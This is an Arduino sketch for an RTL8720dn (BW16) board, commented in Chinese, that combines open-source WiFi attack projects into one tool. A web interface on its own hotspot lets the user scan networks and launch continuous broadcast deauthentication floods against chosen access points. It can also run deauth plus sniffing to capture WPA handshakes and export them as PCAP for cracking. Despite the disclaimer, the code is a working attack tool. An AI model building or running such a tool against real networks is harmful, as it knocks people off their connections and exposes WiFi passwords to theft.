/*
 * BW16 (RTL8720dn) WiFi 多功能工具 —— Deauth 攻击 + WPA 握手包抓取 二合一
 *
 * 合并自两个开源项目：
 *  - RTL8720dn-Deauther (tesa-klebeband)：扫描 + 多目标 deauth 攻击 + 漂亮的深色网页
 *  - RTL8720dn-Handshake-Capture (Cancro29 / Nickguitar)：deauth + 嗅探抓取 WPA 四次握手并导出 PCAP
 *  - 发包代码 wifi_cust_tx 来自 tesa-klebeband 的 RTL8720dn-WiFi-Packet-Injection
 *
 * 功能说明：
 *  1. 开机建立 SoftAP 热点，手机/电脑连上后访问 192.168.1.1 打开全中文网页
 *  2. 可扫描周边 2.4GHz / 5GHz WiFi
 *  3. 【攻击模式】勾选一个或多个网络，对其连续发送 deauth 帧，踢掉已连接的客户端
 *  4. 【抓包模式】选定单个目标，自动 deauth + 混杂模式嗅探，抓到 WPA/WPA2 四次握手后生成可下载的 PCAP 文件
 *
 * 免责声明：本工具仅用于学习、研究与在授权环境下的安全测试。
 *           在未授权的网络上使用属于违法行为，使用者需自行承担全部法律责任。
 */

#undef max
#include "vector"
#include "map"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// ====================== 扫描结果数据结构 ======================
// 统一供 deauth 攻击和握手抓取两个模块共用
struct WiFiScanResult {
  String ssid;         // 网络名称
  String bssid_str;    // 可读的 BSSID 字符串，形如 AA:BB:CC:DD:EE:FF
  uint8_t bssid[6];    // 原始 BSSID 字节
  short rssi;          // 信号强度(dBm)
  uint8_t channel;     // 信道
};

// 扫描结果列表，握手模块会通过 extern 引用它
std::vector<WiFiScanResult> scan_results;

// ====================== SoftAP 热点配置 ======================
char *ap_ssid = "BW16-WiFi-Tool";   // 热点名称
char *ap_pass = "0123456789";       // 热点密码(至少 8 位)
int ap_channel = 1;                 // 热点所在信道，同时也是握手抓包时的“喂信标”信道

WiFiServer server(80);

// ====================== Deauth 攻击相关状态 ======================
std::map<int, std::vector<int>> deauth_channels;  // 信道 -> 该信道上被选中的网络下标列表
std::vector<int> chs_idx;                          // 需要轮询的信道序列
uint32_t current_ch_idx = 0;                       // 当前轮询到的信道下标
uint32_t sent_frames = 0;                          // 已发送的 deauth 帧计数
uint8_t deauth_bssid[6];                           // 当前发送目标的 BSSID
uint16_t deauth_reason = 2;                        // deauth 原因码

int frames_per_deauth = 5;   // 每次对单个目标发送的帧数
int send_delay = 5;          // 每轮之间的延时(毫秒)
bool isDeauthing = false;    // 是否正在执行攻击

// ====================== RGB 彩灯状态提醒 ======================
// BW16 板载 RGB 灯(AmebaD 提供 LED_R/LED_G/LED_B 引脚宏)。
// 约定：待机=绿灯常亮；抓包/探测/攻击=紫灯(红+蓝)。
// 设为 static inline，供 handshake.h 等后续包含的文件直接调用。
static inline void ledInit() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
}
// 绿灯(待机)：只亮绿
static inline void ledStandby() {
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  digitalWrite(LED_B, LOW);
}
// 紫灯(忙碌：抓包/探测/攻击)：红+蓝同亮
static inline void ledBusy() {
  digitalWrite(LED_R, HIGH);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, HIGH);
}

// ====================== 握手抓取模块 ======================
// 握手模块需要先知道上面的结构与变量，故在其后包含
#include "handshake.h"
// 网页模板放在最后包含，它会引用上面所有状态变量
#include "webpage.h"

// ====================== WiFi 扫描 ======================
// 扫描回调：每发现一个网络就追加到 scan_results
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;  // 确保 SSID 以 '\0' 结尾
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// 执行一次网络扫描(约 5 秒)
int scanNetworks() {
  Serial.print("正在扫描周边 WiFi(约 5 秒)...");
  scan_results.clear();
  // 扫描前确保退出可能开启的混杂/攻击状态，避免扫描失败
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    Serial.println(" 完成!");
    return 0;
  } else {
    Serial.println(" 失败!");
    return 1;
  }
}

// ====================== HTTP 请求解析辅助 ======================
// 从请求行里取出路径部分，例如 "GET /deauth HTTP/1.1" -> "/deauth"
String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

// 解析 POST 表单 body，返回键值对列表
std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;

  String post_data = request.substring(body_start);
  int start = 0;
  int end = post_data.indexOf('&', start);

  while (end != -1) {
    String kv = post_data.substring(start, end);
    int d = kv.indexOf('=');
    if (d != -1) post_params.push_back({kv.substring(0, d), kv.substring(d + 1)});
    start = end + 1;
    end = post_data.indexOf('&', start);
  }
  // 处理最后一个键值对
  String kv = post_data.substring(start);
  int d = kv.indexOf('=');
  if (d != -1) post_params.push_back({kv.substring(0, d), kv.substring(d + 1)});

  return post_params;
}

// 构造标准 HTTP 响应头
String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

// 构造 307 重定向响应(提交表单后跳回首页)
String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

// ====================== setup ======================
void setup() {
  Serial.begin(115200);

  ledInit();
  ledStandby();  // 开机即进入待机绿灯

  // 启动 SoftAP 热点
  WiFi.apbegin(ap_ssid, ap_pass, (char *)String(ap_channel).c_str());
  Serial.println("热点已启动: " + String(ap_ssid));
  Serial.println("请连接热点后在浏览器访问 192.168.1.1");

  // 开机先扫描一次，方便打开网页即可看到网络列表
  scanNetworks();

  server.begin();
}

// ====================== 主循环 ======================
void loop() {
  // 1) 处理网页请求
  WiFiClient client = server.available();
  if (client.connected()) {
    String request;
    request.reserve(512);  // 预分配，减少拼接时的反复堆分配/碎片
    // 读取请求，但限制最大长度：防止异常/恶意的超大请求撑爆堆内存(长时间运行安全)
    const int MAX_REQUEST = 2048;
    int readCount = 0;
    while (client.available() && readCount < MAX_REQUEST) {
      request += (char)client.read();
      readCount++;
    }
    // 若请求超限，丢弃剩余字节，避免滞留
    while (client.available()) client.read();
    String path = parseRequest(request);

    if (path == "/") {
      handleRoot(client);

    } else if (path == "/rescan") {
      // 重新扫描：先停掉攻击，避免扫描受干扰
      isDeauthing = false;
      deauth_channels.clear();
      chs_idx.clear();
      client.write(makeRedirect("/").c_str());
      scanNetworks();

    } else if (path == "/deauth") {
      // 启动多目标 deauth 攻击：解析被勾选的网络
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            int ch = scan_results[idx].channel;
            deauth_channels[ch].push_back(idx);
            chs_idx.push_back(ch);
          }
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeRedirect("/").c_str());

    } else if (path == "/stop") {
      // 停止攻击
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeRedirect("/").c_str());

    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeRedirect("/").c_str());

    } else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int d = String(param.second).toInt();
          send_delay = d <= 0 ? 5 : d;
        }
      }
      client.write(makeRedirect("/").c_str());

    } else if (path == "/select") {
      // 选定握手抓取的单个目标
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "target") {
          int idx = String(param.second).toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            selectTarget(idx);
          }
        }
      }
      client.write(makeRedirect("/").c_str());

    } else if (path == "/capture") {
      // 开始抓握手包：攻击与抓包互斥，先停掉攻击
      isDeauthing = false;
      deauth_channels.clear();
      chs_idx.clear();
      if (hasSelectedTarget()) {
        readyToSniff = true;
      }
      // 先返回等待页(提示会断开、请稍后重连)，随后主循环才会执行阻塞抓包
      client.write(makeCaptureWaitPage().c_str());

    } else if (path == "/scanclients") {
      // 检测目标 AP 当前在线客户端：先停掉攻击，置位后由主循环执行探测
      isDeauthing = false;
      deauth_channels.clear();
      chs_idx.clear();
      if (hasSelectedTarget()) {
        readyToScanClients = true;
      }
      // 先返回等待页，随后主循环才会执行探测
      client.write(makeClientScanWaitPage().c_str());

    } else if (path == "/get_pcap") {
      // 下载抓到的握手包 PCAP 文件
      servePcap(client);
      client.stop();
      return;  // PCAP 已分块发送完毕，直接结束本次循环

    } else if (path == "/resetcap") {
      // 清空已抓取的握手数据，便于重新抓取
      resetCaptureData();
      isHandshakeCaptured = false;
      client.write(makeRedirect("/").c_str());

    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());

    } else {
      String response = makeResponse(404, "text/plain");
      response += "Not found!";
      client.write(response.c_str());
    }

    client.stop();
  }

  // 2) 若请求了在线客户端检测，则执行一次探测(约 4 秒，不发包)
  if (readyToScanClients) {
    scanOnlineClients();
  }

  // 3) 若请求了抓包，则执行一次 deauth + 嗅探抓握手流程(阻塞约 10 秒)
  if (readyToSniff) {
    deauthAndSniff();
  }

  // 4) 执行多目标 deauth 攻击循环
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto &group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);  // 切到该信道
        std::vector<int> &networks = group.second;
        for (int i = 0; i < frames_per_deauth; i++) {
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            // 广播目标地址 FF:FF:FF:FF:FF:FF，踢掉该 AP 下所有客户端
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) current_ch_idx = 0;
  }

  // 空闲时回到热点信道，保证 SoftAP 正常工作
  wext_set_channel(WLAN0_NAME, ap_channel);
}
